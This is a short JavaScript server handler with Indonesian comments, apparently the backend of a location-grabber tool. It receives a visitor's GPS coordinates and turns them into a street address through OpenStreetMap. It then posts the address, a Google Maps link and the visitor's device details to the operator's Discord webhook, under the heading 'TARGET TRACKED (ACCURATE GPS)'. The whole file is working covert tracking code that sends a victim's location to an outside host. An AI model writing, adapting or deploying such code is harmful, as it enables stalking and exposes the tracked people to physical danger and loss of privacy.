export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { lat, lon } = req.body;
        const clientIp = req.headers['x-forwarded-for'] || 'Unknown';
        const userAgent = req.headers['user-agent'] || 'Unknown';

        try {
            // Gunakan reverse geocoding gratis untuk mendeteksi nama kota dari koordinat GPS
            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
            const geoData = await geoRes.json();
            const address = geoData.display_name || 'Tidak diketahui';

            const discordWebhookUrl = "URL_WEBHOOK_DISCORD_ANDA"; // Ganti dengan Webhook Discord Anda

            if (discordWebhookUrl && discordWebhookUrl !== "URL_WEBHOOK_DISCORD_ANDA") {
                const message = {
                    content: `🎯 **TARGET TERLACAK (GPS AKURAT)!** 🎯\n` +
                             `📍 **Alamat:** ${address}\n` +
                             `🌐 **Koordinat:** [Google Maps](https://www.google.com/maps?q=${lat},${lon})\n` +
                             `💻 **Perangkat:** ${userAgent}`
                };

                await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(message)
                });
            }
        } catch (error) {
            console.error("Gagal memproses lokasi:", error);
        }

        return res.status(200).json({ success: true });
    }
    res.status(405).json({ error: 'Method not allowed' });
}